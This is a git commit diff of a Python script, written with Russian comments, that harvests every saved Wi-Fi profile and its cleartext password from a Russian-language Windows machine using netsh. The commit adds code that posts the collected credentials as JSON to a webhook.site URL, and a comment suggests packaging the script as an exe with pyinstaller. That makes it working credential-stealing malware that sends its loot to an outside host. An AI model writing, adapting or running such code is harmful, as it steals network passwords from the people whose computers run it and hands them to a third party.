88f8041471d43d78a80de593a7a2c7df22633f8f
Alexander <122954102+alek-dunaev@users.noreply.github.com>
2023-06-15 15:20:15 +0500

    Загрузка всех wifi подключений
    Обновил код для формирования exe файла

--- wi_fi_ru.py
+++ wi_fi_ru.py
@@ -1,24 +1,30 @@
 """Загрузка всех паролей от wi_fi на русской Windows"""
+# для формирования exe используй pyinstaller. Свободный сайт https://webhook.site/
 
 import subprocess
 import re
+import requests
+import json
 
-
+print('Начало работы скрипта')
 command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode('cp866')
-# print(command_output)
+
 profile_names = (re.findall("Все профили пользователей     : (.*)\r", command_output))
-print(profile_names)
+print(f'Профайлов получено: {profile_names.__len__()}')
+
 wifi_list = []
 
 if len(profile_names) != 0:
     for name in profile_names:
         wifi_profile = {}
-        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode('cp866')
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode(
+            'cp866')
         if re.search("Ключ безопасности:       Отсутствует", profile_info):
             continue
         else:
             wifi_profile["ssid"] = name
-            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode('cp866')
+            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
+                                               capture_output=True).stdout.decode('cp866')
             password = re.search("Содержимое ключа            : (.*)\r", profile_info_pass)
             if password == None:
                 wifi_profile["password"] = None
@@ -26,6 +32,8 @@ if len(profile_names) != 0:
                 wifi_profile["password"] = password[1]
             wifi_list.append(wifi_profile)
 
-for x in range(len(wifi_list)):
-    print(wifi_list[x])
+url = 'https://webhook.site/cff51db1-556c-4973-bd80-dd6c37df4b59'
+
+requests.post(url, json=json.dumps(wifi_list))
+
     
